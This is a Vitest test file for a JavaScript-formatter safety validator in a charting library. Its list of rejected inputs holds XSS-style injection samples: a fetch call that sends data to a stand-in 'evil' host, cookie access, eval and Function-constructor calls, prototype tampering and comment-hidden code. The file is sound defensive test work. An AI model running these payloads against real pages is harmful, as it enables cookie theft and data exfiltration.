import { describe, it, expect, vi } from 'vitest'
import { isSafeMvizJs, hydrateJsFunctions } from '../../core/echarts-bridge-factory'

describe('isSafeMvizJs — accepts real mviz formatters', () => {
  const realMvizPayloads = [
    // getLabelFormatterJs for 'currency_auto'
    `function(params) {
  var v = params.value;
  if (v == null) return '';
  if (Array.isArray(v)) v = v[1];
  var abs = Math.abs(v);
  var neg = v < 0;
  var p = true ? "$" : '';
  var loc = "en-US"; var lf = function(v, d) { return v.toLocaleString(loc, {minimumFractionDigits:d, maximumFractionDigits:d}); };
  var r;
  r = abs === Math.floor(abs) ? p + abs : p + lf(abs,2);
  return neg ? '(' + r + ')' : r;
}`,
    // bubble.js symbolSize
    'function(val) { return val[3] || 20; }',
    // funnel.js formatter
    "function(params) { return params.name + ': ' + (params.value * 100).toFixed(1) + '%'; }",
    // heatmap.js simple formatter
    `function(params) { return params.value[${2}] || ""; }`,
  ]
  for (const src of realMvizPayloads) {
    it(`accepts: ${src.slice(0, 40)}...`, () => {
      expect(isSafeMvizJs(src)).toBe(true)
    })
  }
})

describe('isSafeMvizJs — rejects injection attempts', () => {
  const maliciousPayloads: Array<[string, string]> = [
    [
      "payload via currency.symbol breakout",
      "function(params) { return ''; (function(){ alert(1) })(); '' + params.value.toLocaleString('en-US'); }",
    ],
    [
      "eval reference",
      "function(p) { return eval('1+1'); }",
    ],
    [
      "Function constructor",
      "function(p) { return Function('return 1')(); }",
    ],
    [
      "window access",
      "function(p) { return window.document.cookie; }",
    ],
    [
      "document access",
      "function(p) { document.write('x'); return ''; }",
    ],
    [
      "fetch exfil",
      "function(p) { fetch('//evil/'+p); return ''; }",
    ],
    [
      "setTimeout",
      "function(p) { setTimeout(function(){}, 0); return ''; }",
    ],
    [
      "constructor chain",
      "function(p) { return p.constructor.constructor('x')(); }",
    ],
    [
      "proto manipulation",
      "function(p) { p.__proto__.x = 1; return ''; }",
    ],
    [
      "template literal obfuscation",
      "function(p) { return `${p.value}`; }",
    ],
    [
      "line comment hiding",
      "function(p) { return ''; // eval('x')\n }",
    ],
    [
      "block comment hiding",
      "function(p) { /* eval('x') */ return ''; }",
    ],
    [
      "arrow function (not mviz output)",
      "(p) => p.value",
    ],
    [
      "not a function",
      "1 + 1",
    ],
    [
      "oversized payload",
      'function(p) { return "' + 'a'.repeat(5000) + '"; }',
    ],
  ]
  for (const [label, src] of maliciousPayloads) {
    it(`rejects: ${label}`, () => {
      expect(isSafeMvizJs(src)).toBe(false)
    })
  }
})

describe('hydrateJsFunctions', () => {
  it('compiles a safe _js_ into a working function', () => {
    const out = hydrateJsFunctions({ _js_: 'function(x) { return x * 2; }' }) as (n: number) => number
    expect(typeof out).toBe('function')
    expect(out(21)).toBe(42)
  })

  it('returns undefined and warns for unsafe _js_', () => {
    const spy = vi.spyOn(console, 'warn').mockImplementation(() => {})
    const out = hydrateJsFunctions({
      _js_: "function(p) { return ''; fetch('//evil'); '' }",
    })
    expect(out).toBeUndefined()
    expect(spy).toHaveBeenCalled()
    spy.mockRestore()
  })

  it('never invokes the payload during validation (no side effects on reject)', () => {
    const globalAny = globalThis as unknown as Record<string, unknown>
    delete globalAny.__vizual_pwned
    const spy = vi.spyOn(console, 'warn').mockImplementation(() => {})
    hydrateJsFunctions({
      _js_: "function(p) { globalThis.__vizual_pwned = true; return ''; }",
    })
    expect(globalAny.__vizual_pwned).toBeUndefined()
    spy.mockRestore()
  })

  it('walks nested structures and leaves non-_js_ values intact', () => {
    const spy = vi.spyOn(console, 'warn').mockImplementation(() => {})
    const input = {
      series: [
        {
          formatter: { _js_: 'function(p) { return p.name; }' },
          data: [1, 2, 3],
        },
      ],
      title: 'hello',
      badFormatter: { _js_: "function(p) { return eval('1'); }" },
    }
    const out = hydrateJsFunctions(input) as Record<string, unknown>
    expect(out.title).toBe('hello')
    const series = out.series as Array<Record<string, unknown>>
    expect(typeof series[0].formatter).toBe('function')
    expect(series[0].data).toEqual([1, 2, 3])
    expect(out.badFormatter).toBeUndefined()
    spy.mockRestore()
  })
})
